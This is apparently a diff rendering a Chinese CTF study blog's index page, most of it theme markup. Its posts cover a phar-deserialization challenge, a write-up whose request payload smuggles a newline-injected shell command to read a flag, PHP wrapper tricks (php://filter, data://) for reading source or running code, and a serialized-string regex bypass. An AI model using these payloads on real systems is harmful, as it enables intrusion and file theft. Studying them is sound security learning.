@@ -1,23 +1,49 @@
 <!DOCTYPE html>
-<html lang="{{ page.lang }}">
+<html lang="zh-Hans">
 <head>
-  {{ partial('_partials/head/head.njk', {}, {cache: theme.cache.enable}) }}{{ open_graph() }}
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
 
 
-<link rel="canonical" href="{{ canonical }}">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
 
-{{ next_data('page', next_config_unique()) }}
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-{{ next_data('calendar',
-  theme.calendar if page.type === 'schedule' else '')
-}}
-<title>{{ title }}</title>
-  {{ partial('_third-party/analytics/index.njk', {}, {cache: theme.cache.enable}) }}
-  {{- next_inject('head') }}
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Suche...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta property="og:type" content="website">
+<meta property="og:title" content="wds&#39;s 学习博客">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="wds&#39;s 学习博客">
+<meta property="og:locale">
+<meta property="article:author" content="wang deshan">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-Hans","comments":"","permalink":"","path":"index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>wds's 学习博客</title>
+  
+
+
+
+
   <noscript>
-    <link rel="stylesheet" href="{{ url_for(theme.css) }}/noscript.css">
+    <link rel="stylesheet" href="/css/noscript.css">
   </noscript>
 <link rel="alternate" href="/atom.xml" title="wds's 学习博客" type="application/atom+xml">
 </head>
@@ -27,42 +53,977 @@
 
   <main class="main">
     <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner">{{ partial('_partials/header/brand.njk', {}, {cache: theme.cache.enable}) }}
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Navigationsleiste an/ausschalten" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
 
-{{ partial('_partials/header/menu.njk', {}, {cache: theme.cache.enable}) }}
+  <div class="site-meta">
 
-{{ partial('_partials/search/index.njk', {}, {cache: theme.cache.enable}) }}
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">wds's 学习博客</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
 
-{{- next_inject('header') }}
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Startseite</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Schlagwörter</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Kategorien</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archiv</a></li>
+  </ul>
+</nav>
+
+
+
+
 </div>
         
-  {{ sidebar_template.render(false) }}
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">wang deshan</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">40</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">Kategorien</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">schlagwörter</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
 
     </header>
 
-    {{ partial('_partials/widgets.njk', {}, {cache: theme.cache.enable}) }}
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
 
     <div class="main-inner index posts-expand">
 
-    {{ partial('_macro/post.njk', {post: post, is_index: true}) }}
-    {{ partial('_macro/post.njk', {post: post, is_index: true}) }}
-    {{ partial('_macro/post.njk', {post: post, is_index: true}) }}
-    {{ partial('_macro/post.njk', {post: post, is_index: true}) }}
-    {{ partial('_macro/post.njk', {post: post, is_index: true}) }}
-    {{ partial('_macro/post.njk', {post: post, is_index: true}) }}
-    {{ partial('_macro/post.njk', {post: post, is_index: true}) }}
-    {{ partial('_macro/post.njk', {post: post, is_index: true}) }}
-    {{ partial('_macro/post.njk', {post: post, is_index: true}) }}
-    {{ partial('_macro/post.njk', {post: post, is_index: true}) }}
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/25/hello-world/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/11/25/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Veröffentlicht am</span>
+
+      <time title="Erstellt: 2023-11-25 14:25:33" itemprop="dateCreated datePublished" datetime="2023-11-25T14:25:33+08:00">2023-11-25</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Bearbeitet am</span>
+        <time title="Geändert am: 2021-09-18 01:39:10" itemprop="dateModified" datetime="2021-09-18T01:39:10+08:00">2021-09-18</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/27/20220427/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/27/20220427/" class="post-title-link" itemprop="url">20220427</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Veröffentlicht am</span>
+      
+
+      <time title="Erstellt: 2022-04-27 21:04:04 / Geändert am: 21:17:14" itemprop="dateCreated datePublished" datetime="2022-04-27T21:04:04+08:00">2022-04-27</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="phar序列化"><a href="#phar序列化" class="headerlink" title="phar序列化"></a>phar序列化</h1><h2 id="swpuctf2018simplephp1"><a href="#swpuctf2018simplephp1" class="headerlink" title="swpuctf2018simplephp1"></a>swpuctf2018simplephp1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;<span class="comment">#str[&#x27;str&#x27;]有个成员source，则str[&#x27;str&#x27;]是一个类str[&#x27;str&#x27;]=new Test()</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)#$<span class="title">key</span>=<span class="title">source</span>自动复制，因为<span class="title">show</span>的</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>];<span class="comment">#$value=&quot;/var/www/html/f1ag.php&quot;</span></span><br><span class="line">                                         <span class="comment">#$params[key]=&quot;/var/www/html/f1ag.php&quot;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>C1e4r</p>
+<p>分析：__construct($name)是在C1e4r被创造时执行</p>
+<p>__destruct()是在被销毁时执行</p>
+<h3 id="Show"><a href="#Show" class="headerlink" title="Show"></a>Show</h3><p>分析：__toString()是在被当作字符串打印时执行，可以由C1e4r中的echo触发</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/25/20220425/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/25/20220425/" class="post-title-link" itemprop="url">20220425</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Veröffentlicht am</span>
+      
+
+      <time title="Erstellt: 2022-04-25 20:59:23 / Geändert am: 21:31:36" itemprop="dateCreated datePublished" datetime="2022-04-25T20:59:23+08:00">2022-04-25</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="favorite-num"><a href="#favorite-num" class="headerlink" title="favorite_num"></a>favorite_num</h1><h2 id="1-php数组下标的整形溢出"><a href="#1-php数组下标的整形溢出" class="headerlink" title="1.php数组下标的整形溢出"></a>1.php数组下标的整形溢出</h2><p>也就是说数组中下表为0的元素与下表为4294967296 //0x100000000 的元素表示同一个</p>
+<h2 id="2-绕过对num的检查"><a href="#2-绕过对num的检查" class="headerlink" title="2.绕过对num的检查"></a>2.绕过对num的检查</h2><p>%0a（换行符来绕过）</p>
+<p>%0als /</p>
+<p>然后用tac读取得到flag</p>
+<p>stuff%5B4294967296%5D=admin&amp;stuff%5B1%5D=user&amp;num=123%0atac <code>find / -inum 37487226</code></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/22/2022-04-22/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/22/2022-04-22/" class="post-title-link" itemprop="url">2022.04.22</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Veröffentlicht am</span>
+      
+
+      <time title="Erstellt: 2022-04-22 19:24:06 / Geändert am: 19:25:26" itemprop="dateCreated datePublished" datetime="2022-04-22T19:24:06+08:00">2022-04-22</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id=""><a href="#" class="headerlink" title=""></a></h1>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/18/20220418/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/18/20220418/" class="post-title-link" itemprop="url">20220418</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Veröffentlicht am</span>
+
+      <time title="Erstellt: 2022-04-18 13:12:08" itemprop="dateCreated datePublished" datetime="2022-04-18T13:12:08+08:00">2022-04-18</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Bearbeitet am</span>
+        <time title="Geändert am: 2022-04-26 19:51:14" itemprop="dateModified" datetime="2022-04-26T19:51:14+08:00">2022-04-26</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="宽松比较（-）类型转化规则"><a href="#宽松比较（-）类型转化规则" class="headerlink" title="宽松比较（==）类型转化规则"></a>宽松比较（==）类型转化规则</h1><p>（1）数字和字符串比较，将字符串转化为数字，然后进行比较</p>
+<p>若字符串的开头不为数字则转化成0，如有数字则转化成该数字</p>
+<p>（2）数字和布尔型比较，将数字转为布尔型，然后进行比较</p>
+<p>（3）字符串和布尔型的比较，将字符串转化为布尔型，然后进行比较</p>
+<p>总结：宽松比较的落脚点只有两个，一个是布尔型，一个是数字型。只有当数字和字符串比较的时候，会将字符串转为数字型</p>
+<h1 id="str-replace-find-replace-string-count"><a href="#str-replace-find-replace-string-count" class="headerlink" title="str_replace(find,replace,string,count)"></a>str_replace(find,replace,string,count)</h1><p>find,必需，要查找的值</p>
+<p>replace，必需要覆盖掉的值</p>
+<p>sting，必需，被搜索的字符串</p>
+<p>count，可舍，替换次数</p>
+<p>可以利用大小写绕过</p>
+<p>1.php伪协议</p>
+<p>用法</p>
+<p>php://input.用于执行php代码，需要post请求提交数据。</p>
+<p>php://filter,用于读取源代码，get提交参数。</p>
+<p>a=php://filter/read=convert.base64/resource=xxx.php</p>
+<p>2.data伪协议</p>
+<p>用法data://text/p;ain,xxxx(要执行的php代码)</p>
+<p>data://text/plain;base64,xxxx(base64编码后的数据)</p>
+<p>3.file伪协议</p>
+<p>用法：</p>
+<p>file://[本地文件系统的绝对路径]</p>
+<h1 id="正则匹配：preg-match-‘-oc-d-i’-var"><a href="#正则匹配：preg-match-‘-oc-d-i’-var" class="headerlink" title="正则匹配：preg_match(‘/[oc]:\d+:/i’,$var)"></a>正则匹配：preg_match(‘/[oc]:\d+:/i’,$var)</h1><p>‘[oc]’ 匹配o或者c</p>
+<p>‘\d’ 匹配任意一个十进制数</p>
+<p>‘+’匹配前面字符的1-N次数<br>‘i’ 表示不区分大小写</p>
+<p>绕过方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$var</span>=<span class="string">&#x27;O:+4:&quot;Demo&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); 				</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;								</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;  </span><br><span class="line">    &#125; </span><br><span class="line">	<span class="comment">#由于我们把O:4改为了O:+4，那么就匹配不完全，则成功绕过正则匹配</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
